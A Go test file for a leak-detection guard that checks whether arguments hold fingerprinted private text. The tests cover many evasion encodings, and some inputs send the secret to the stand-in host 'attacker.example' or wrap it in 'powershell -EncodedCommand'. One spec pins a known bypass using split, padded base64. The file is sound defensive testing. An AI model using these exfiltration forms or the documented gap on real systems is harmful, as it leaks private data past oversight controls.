// SPDX-License-Identifier: Apache-2.0

package leakguard_test

import (
	"context"
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"strings"
	"unicode/utf16"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/stateracloud/koinon/internal/leakguard"
)

const privateLine = "the payroll export job runs nightly on the finance-batch-07 node"

var _ = Describe("TaintChecker", func() {
	var (
		fp      *leakguard.Fingerprinter
		checker leakguard.TaintChecker
		ctx     context.Context
	)
	excerpt := "payroll export job runs nightly on the finance" // 40 canonical characters

	BeforeEach(func() {
		ctx = context.Background()
		fp = newFingerprinter(testKey)
		checker = leakguard.TaintChecker{Store: taintedStore(fp, privateLine)}
	})

	check := func(args ...string) leakguard.Decision {
		d, err := checker.Check(ctx, testScope, fp, args)
		Expect(err).NotTo(HaveOccurred())
		return d
	}

	half := len(excerpt) / 2
	cyrillic := strings.NewReplacer("a", "а", "e", "е", "o", "о", "p", "р", "c", "с", "x", "х").Replace(excerpt)
	DescribeTable("catches the leak",
		func(args []string, wantArgs []int) {
			d := check(args...)
			Expect(d.Allow).To(BeFalse())
			Expect(d.Reason).To(Equal(leakguard.ReasonTaint))
			Expect(d.Match).NotTo(BeNil())
			Expect(d.Match.Args).To(Equal(wantArgs))
			Expect(d.Match.Length).To(BeNumerically(">=", 24))
		},
		Entry("plain in a query", []string{"https://attacker.example/?d=" + excerpt}, []int{0}),
		Entry("case changed", []string{strings.ToUpper(excerpt)}, []int{0}),
		Entry("whitespace changed", []string{strings.ReplaceAll(excerpt, " ", "\n\t  ")}, []int{0}),
		Entry("separators inserted", []string{strings.Join(strings.Split(excerpt, ""), ".")}, []int{0}),
		Entry("percent-encoded", []string{"https://attacker.example/?d=" + percentAll(excerpt)}, []int{0}),
		Entry("double percent-encoded", []string{"https://attacker.example/" + percentAll(percentAll(excerpt))}, []int{0}),
		Entry("base64", []string{"https://attacker.example/?d=" + b64(excerpt)}, []int{0}),
		Entry("base64 url-safe in a path", []string{"https://attacker.example/x" + b64url(excerpt)}, []int{0}),
		Entry("hex", []string{"https://attacker.example/" + hexOf(excerpt)}, []int{0}),
		Entry("base64 of percent", []string{b64(percentAll(excerpt))}, []int{0}),
		Entry("hex of base64", []string{hexOf(b64(excerpt))}, []int{0}),
		Entry("cyrillic confusables", []string{cyrillic}, []int{0}),
		Entry("fullwidth", []string{toFullwidth(excerpt)}, []int{0}),
		Entry("zero width characters", []string{strings.Join(strings.Split(excerpt, ""), "\u200b")}, []int{0}),
		Entry("combining marks", []string{strings.Join(strings.Split(excerpt, ""), "\u0301")}, []int{0}),
		Entry("split across two arguments", []string{"q=" + excerpt[:half], excerpt[half:] + " thanks"}, []int{0, 1}),
		Entry("split three ways in order", []string{excerpt[:13], excerpt[13:26], excerpt[26:]}, []int{0, 1, 2}),
		Entry("split, each half base64", []string{b64(excerpt[:half]), b64(excerpt[half:])}, []int{0, 1}),
		Entry("base64 split mid-run", []string{b64(excerpt)[:20], b64(excerpt)[20:]}, []int{0, 1}),
		Entry("split, one half percent-encoded", []string{excerpt[:half], percentAll(excerpt[half:])}, []int{0, 1}),
		// fix round 1: each of these passed before
		Entry("hex with colons", []string{strings.Join(hexBytes(excerpt), ":")}, []int{0}),
		Entry("hex xxd-style", []string{chunks(hexOf(excerpt), 4, " ")}, []int{0}),
		Entry("hex in chunks of 14", []string{chunks(hexOf(excerpt), 14, " ")}, []int{0}),
		Entry(`hex as \x escapes`, []string{`\x` + strings.Join(hexBytes(excerpt), `\x`)}, []int{0}),
		Entry("hex as 0x bytes", []string{"0x" + strings.Join(hexBytes(excerpt), ", 0x")}, []int{0}),
		Entry("base64 in chunks of 15", []string{chunks(b64(excerpt), 15, " ")}, []int{0}),
		Entry("base64 in lines of 18", []string{chunks(b64(excerpt), 18, "\n")}, []int{0}),
		Entry("two base64 blobs at different alignments in one run",
			[]string{b64raw(excerpt[:21]) + "Q" + b64raw(excerpt[21:])}, []int{0}),
		Entry("base64 of UTF-16LE (PowerShell -EncodedCommand)", []string{"powershell -EncodedCommand " + b64(utf16le(excerpt))}, []int{0}),
		Entry("hex of UTF-16LE", []string{hexOf(utf16le(excerpt))}, []int{0}),
		Entry(`\u escapes`, []string{uEscapes(excerpt)}, []int{0}),
		Entry("HTML character references", []string{htmlRefs(excerpt)}, []int{0}),
		Entry("base32", []string{base32.StdEncoding.EncodeToString([]byte(excerpt))}, []int{0}),
		// fix round 2: each of these passed before
		Entry("base64 in chunks of 3", []string{chunks(b64(excerpt), 3, " ")}, []int{0}),
		Entry("base64 in chunks of 4", []string{chunks(b64(excerpt), 4, " ")}, []int{0}),
		Entry("base64 in chunks of 8 with ' - '", []string{chunks(b64(excerpt), 8, " - ")}, []int{0}),
		Entry("base64 in chunks of 8 with '!'", []string{chunks(b64(excerpt), 8, "!")}, []int{0}),
		Entry("base32 in chunks of 4", []string{chunks(base32.StdEncoding.EncodeToString([]byte(excerpt)), 4, " ")}, []int{0}),
		Entry("hex, one ' - ' per byte", []string{strings.Join(hexBytes(excerpt), " - ")}, []int{0}),
		Entry("hex, one '---' per byte", []string{strings.Join(hexBytes(excerpt), "---")}, []int{0}),
		Entry("hex, one '_-_' per byte", []string{strings.Join(hexBytes(excerpt), "_-_")}, []int{0}),
		Entry("hex, one ',;:' per byte", []string{strings.Join(hexBytes(excerpt), ",;:")}, []int{0}),
		Entry("hex, one ' / ' per byte", []string{strings.Join(hexBytes(excerpt), " / ")}, []int{0}),
		Entry("hex, one '/' per byte", []string{strings.Join(hexBytes(excerpt), "/")}, []int{0}),
		Entry("hex, one '+' per byte", []string{strings.Join(hexBytes(excerpt), "+")}, []int{0}),
		Entry("hex, one '\\n  ' per byte", []string{strings.Join(hexBytes(excerpt), "\n  ")}, []int{0}),
		Entry("hex nibbles with ' - '", []string{chunks(hexOf(excerpt), 1, " - ")}, []int{0}),
		Entry("base64 of UTF-16LE fullwidth", []string{b64(utf16le(toFullwidth(excerpt)))}, []int{0}),
		Entry("base64 of UTF-16LE cyrillic", []string{b64(utf16le(cyrillic))}, []int{0}),
		Entry("base64 of UTF-16LE mathematical bold", []string{b64(utf16le(mathBold(excerpt)))}, []int{0}),
		Entry(`\u surrogate pairs of mathematical bold`, []string{uEscapes(mathBold(excerpt))}, []int{0}),
		Entry("hex after NUL padding (found by FuzzTaint)", []string{"000000000000 " + hexOf(excerpt) + " 0"}, []int{0}),
		Entry("hex after long NUL padding", []string{strings.Repeat("00", 40) + hexOf(excerpt)}, []int{0}),
		Entry("base64 after NUL padding", []string{"AAAAAAAAAAAAAAAA" + b64raw(excerpt)}, []int{0}),
		Entry("split across adjacent arguments of 33", spread(33, 16, excerpt[:half], 17, excerpt[half:]), allArgs(33)),
	)

	DescribeTable("folds the digits of every script",
		func(zero rune) {
			const account = "card 4417 1234 5678 9012 3456 exp 0927"
			checker.Store = taintedStore(fp, account)
			other := strings.Map(func(r rune) rune {
				if '0' <= r && r <= '9' {
					return zero + r - '0'
				}
				return r
			}, account)
			Expect(check(other).Reason).To(Equal(leakguard.ReasonTaint))
		},
		Entry("arabic-indic", '\u0660'),
		Entry("devanagari", '\u0966'),
		Entry("thai", '\u0e50'),
		Entry("mathematical monospace", '\U0001d7f6'),
	)

	It("fails closed when the arguments are more than it checks", func() {
		args := make([]string, leakguard.DefaultLimits().MaxArgs+1)
		for i := range args {
			args[i] = "filler"
		}
		d := check(args...)
		Expect(d.Allow).To(BeFalse())
		Expect(d.Reason).To(Equal(leakguard.ReasonBudgetArgs))
	})

	// ADR 0091 decision 6: the arguments are joined in call order, and in the orders a caller names
	// (CheckJoins), only. A text split across arguments that are not adjacent in one of them, or put
	// back to front, is not reassembled; the sink class and the byte cap carry that case, not the
	// text match.
	DescribeTable("does not reassemble out of call order",
		func(args ...string) { Expect(check(args...).Reason).To(Equal(leakguard.ReasonPass)) },
		Entry("halves reversed", excerpt[half:], excerpt[:half]),
		Entry("halves with an argument between", excerpt[:half], "ignored", excerpt[half:]),
	)

	// A known gap, not a promise (#286, found in the #267 review): separator-padded base64 cut across
	// two arguments that each exceed 2*JoinEndBytes. The join keeps only each argument's two ends, and
	// the padding spreads the encoded text past them. This pins today's decision so a fix shows up as
	// a failing spec: when the general fix (#369) lands, move the entry into "catches the leak" and drop
	// this one. #286 documents the gap (ADR 0091 decision 6) and adds no code.
	It("passes separator-padded base64 split across two long arguments (known gap, #286)", func() {
		w := leakguard.DefaultLimits().JoinEndBytes
		// one separator of 150 bytes per four base64 characters: each half is longer than 2*w, and the
		// 512 bytes that reach the join hold only a few characters of the encoded text
		enc := chunks(b64raw(excerpt), 4, " "+strings.Repeat("-", 150)+" ")
		h := len(enc) / 2
		args := []string{enc[:h], enc[h:]}
		Expect(len(args[0])).To(BeNumerically(">", 2*w))
		Expect(len(args[1])).To(BeNumerically(">", 2*w))
		Expect(check(args...).Reason).To(Equal(leakguard.ReasonPass), "the split base64 gap is closed (#369): this is now a catch")
	})

	Describe("joining in the orders the caller names (#256)", func() {
		joins := func(args []string, orders ...[]int) leakguard.Decision {
			GinkgoHelper()
			d, err := checker.CheckJoins(ctx, testScope, fp, args, orders...)
			Expect(err).NotTo(HaveOccurred())
			return d
		}

		It("reassembles halves that are adjacent in a named order", func() {
			Expect(joins([]string{excerpt[half:], excerpt[:half]}, []int{1, 0}).Reason).To(Equal(leakguard.ReasonTaint))
			Expect(joins([]string{excerpt[:half], "ignored", excerpt[half:]}, []int{1, 0, 2}).Reason).To(Equal(leakguard.ReasonTaint))
		})

		It("still joins in call order", func() {
			Expect(joins([]string{excerpt[:half], excerpt[half:]}, []int{1, 0}).Reason).To(Equal(leakguard.ReasonTaint))
		})

		It("joins an order given twice once", func() {
			args := []string{excerpt[half:], excerpt[:half], "kubernetes release notes"}
			_, once, err := checker.CheckJoinsWork(ctx, testScope, fp, args, []int{1, 0, 2})
			Expect(err).NotTo(HaveOccurred())
			_, twice, err := checker.CheckJoinsWork(ctx, testScope, fp, args, []int{1, 0, 2}, []int{2, 1, 0}, []int{1, 0, 2})
			Expect(err).NotTo(HaveOccurred())
			_, two, err := checker.CheckJoinsWork(ctx, testScope, fp, args, []int{1, 0, 2}, []int{2, 1, 0})
			Expect(err).NotTo(HaveOccurred())
			Expect(once).To(BeNumerically("<", two))
			Expect(twice).To(Equal(two))
		})

		// Review of #256: a call padded with heavy benign arguments still has its extra orders
		// joined with the full ends. Each half is percent-encoded \UHHHHHHHH escapes (two promised
		// decoders, about 30 bytes a character), so the 24-character window needs more than 128
		// bytes on each side of the boundary; shorter ends under load let it through.
		It("reassembles a split in a named order in a call padded past a quarter of the work budget", func() {
			enc := func(s string) string { return percentAll(bigUEscapes(s)) }
			pad := sliced(120, func(i int) string { return b64(utf16le(string([]rune(russianProse)[i*50 : i*50+1500]))) })
			args := append([]string{enc(privateLine[23:46]) + " tail of b", "head of a " + enc(privateLine[0:23])}, pad...)
			order := []int{1, 0}
			for i := 2; i < len(args); i++ {
				order = append(order, i)
			}
			lim := leakguard.DefaultLimits()
			c := leakguard.TaintChecker{Store: checker.Store, Limits: lim}
			d, work, err := c.CheckWork(ctx, testScope, fp, args)
			Expect(err).NotTo(HaveOccurred())
			Expect(d.Reason).To(Equal(leakguard.ReasonPass), "in call order the halves are the wrong way round")
			Expect(work).To(BeNumerically(">", int64(lim.MaxWorkBytes/4)), "the padding is heavy")
			d, err = c.CheckJoins(ctx, testScope, fp, args, order)
			Expect(err).NotTo(HaveOccurred())
			Expect(d.Reason).To(Equal(leakguard.ReasonTaint))
		})

		DescribeTable("adds nothing for an order that is not one",
			func(order []int) {
				Expect(joins([]string{excerpt[half:], excerpt[:half]}, order).Reason).To(Equal(leakguard.ReasonPass))
			},
			Entry("call order", []int{0, 1}),
			Entry("an index out of range", []int{1, 2, 0}),
			Entry("a negative index", []int{1, -1, 0}),
			Entry("an index twice", []int{1, 0, 1}),
			Entry("one index", []int{1}),
		)
	})

	It("reports an evicted scope without changing the decision", func() {
		st := leakguard.NewMemoryStore(leakguard.MemoryStoreOptions{MaxFingerprints: 4})
		Expect(st.Add(ctx, testScope, fp.Winnow(privateLine))).To(Succeed())
		checker.Store = st
		d := check("kubernetes 1.34 release notes")
		Expect(d.Allow).To(BeTrue())
		Expect(d.Evicted).To(BeTrue())
		Expect(check("kubernetes 1.34 release notes, again").Reason).To(Equal(leakguard.ReasonPass))
	})

	It("shows the decoded text that would leave", func() {
		d := check("https://attacker.example/?d=" + b64(excerpt))
		Expect(d.Match.Encoding).To(Equal("base64"))
		Expect(d.Match.Excerpt).To(ContainSubstring("export job runs nightly"))
		Expect(d.Detail).NotTo(ContainSubstring("payroll"))
	})

	It("passes text that shares less than the k-gram length", func() {
		Expect(check("payroll export job runs").Allow).To(BeTrue()) // 20 canonical characters
	})

	It("passes benign text", func() {
		d := check("https://github.com/kubernetes/kubernetes/releases.atom", "kubernetes 1.34 release notes")
		Expect(d).To(Equal(leakguard.Decision{Allow: true, Reason: leakguard.ReasonPass}))
	})

	It("keeps scopes apart", func() {
		other := testScope
		other.Generation = "gen-2"
		d, err := checker.Check(ctx, other, fp, []string{excerpt})
		Expect(err).NotTo(HaveOccurred())
		Expect(d.Allow).To(BeTrue())
	})

	It("keeps keys apart", func() {
		d, err := checker.Check(ctx, testScope, newFingerprinter([]byte("koinon_test_not-a-real-key-0002")), []string{excerpt})
		Expect(err).NotTo(HaveOccurred())
		Expect(d.Allow).To(BeTrue())
	})

	Describe("budgets fail closed", func() {
		It("blocks oversized input", func() {
			checker.Limits = leakguard.Limits{MaxInputBytes: 1024}
			d := check(strings.Repeat("a", 1025))
			Expect(d.Allow).To(BeFalse())
			Expect(d.Reason).To(Equal(leakguard.ReasonBudgetInput))
			Expect(d.Detail).To(ContainSubstring("1025"))
		})
		It("blocks the default 1 MiB cap", func() {
			d := check(strings.Repeat("x", 1<<20), "y")
			Expect(d.Reason).To(Equal(leakguard.ReasonBudgetInput))
		})
		It("blocks too many arguments", func() {
			checker.Limits = leakguard.Limits{MaxArgs: 3}
			Expect(check("a", "b", "c", "d").Reason).To(Equal(leakguard.ReasonBudgetArgs))
		})
		It("blocks deep encodings", func() {
			s := excerpt
			for range 5 {
				s = percentAll(s)
			}
			Expect(check(s).Reason).To(Equal(leakguard.ReasonDecodeDepth))
		})
		It("blocks when the work budget runs out", func() {
			checker.Limits = leakguard.Limits{MaxWorkBytes: 4096}
			Expect(check(strings.Repeat("plain text ", 400)).Reason).To(Equal(leakguard.ReasonBudgetWork))
		})
		It("blocks when the context is done", func() {
			c, cancel := context.WithCancel(ctx)
			cancel()
			d, err := checker.Check(c, testScope, fp, []string{excerpt})
			Expect(err).NotTo(HaveOccurred())
			Expect(d.Reason).To(Equal(leakguard.ReasonBudgetTime))
		})
		It("blocks when the store fails", func() {
			checker.Store = failingStore{}
			d, err := checker.Check(ctx, testScope, fp, []string{excerpt})
			Expect(err).To(HaveOccurred())
			Expect(d.Allow).To(BeFalse())
			Expect(d.Reason).To(Equal(leakguard.ReasonStoreError))
		})
		It("blocks without a store", func() {
			d, err := leakguard.TaintChecker{}.Check(ctx, testScope, fp, []string{"x"})
			Expect(err).To(HaveOccurred())
			Expect(d.Reason).To(Equal(leakguard.ReasonStoreError))
		})
	})
})

type failingStore struct{}

func (failingStore) Add(context.Context, leakguard.Scope, []leakguard.Fingerprint) error {
	return errors.New("down")
}

func (failingStore) Lookup(context.Context, leakguard.Scope, []leakguard.Fingerprint) (leakguard.Hits, error) {
	return leakguard.Hits{}, errors.New("down")
}
func (failingStore) Drop(context.Context, leakguard.Scope) error { return nil }

func toFullwidth(s string) string {
	var b strings.Builder
	for _, r := range s {
		if r > ' ' && r < 0x7f {
			r += 0xFEE0
		}
		b.WriteRune(r)
	}
	return b.String()
}

func b64raw(s string) string { return base64.RawStdEncoding.EncodeToString([]byte(s)) }

func hexBytes(s string) []string {
	out := make([]string, len(s))
	for i := range len(s) {
		out[i] = hex.EncodeToString([]byte{s[i]})
	}
	return out
}

func chunks(s string, n int, sep string) string {
	var parts []string
	for len(s) > n {
		parts = append(parts, s[:n])
		s = s[n:]
	}
	return strings.Join(append(parts, s), sep)
}

func utf16le(s string) string {
	var b []byte
	for _, u := range utf16.Encode([]rune(s)) {
		b = append(b, byte(u), byte(u>>8))
	}
	return string(b)
}

// uEscapes writes s as \uHHHH escapes, characters outside the BMP as surrogate pairs.
func uEscapes(s string) string {
	var b strings.Builder
	for _, u := range utf16.Encode([]rune(s)) {
		fmt.Fprintf(&b, `\u%04x`, u)
	}
	return b.String()
}

// bigUEscapes writes s as \UHHHHHHHH escapes, one per character.
func bigUEscapes(s string) string {
	var b strings.Builder
	for _, r := range s {
		fmt.Fprintf(&b, `\U%08X`, r)
	}
	return b.String()
}

// mathBold writes the lower-case letters of s as mathematical bold letters (U+1D41A on).
func mathBold(s string) string {
	return strings.Map(func(r rune) rune {
		if 'a' <= r && r <= 'z' {
			return 0x1d41a + r - 'a'
		}
		return r
	}, s)
}

func htmlRefs(s string) string {
	var b strings.Builder
	for i, r := range s {
		if i%2 == 0 {
			fmt.Fprintf(&b, "&#%d;", r)
		} else {
			fmt.Fprintf(&b, "&#x%x;", r)
		}
	}
	return b.String()
}

// spread returns n filler arguments with a at index i and b at index j.
// allArgs is the argument indexes 0..n-1, what a match in the call-order join reports.
func allArgs(n int) []int {
	out := make([]int, n)
	for i := range out {
		out[i] = i
	}
	return out
}

func spread(n, i int, a string, j int, b string) []string {
	out := make([]string, n)
	for k := range out {
		out[k] = fmt.Sprintf("filler %d", k)
	}
	out[i], out[j] = a, b
	return out
}
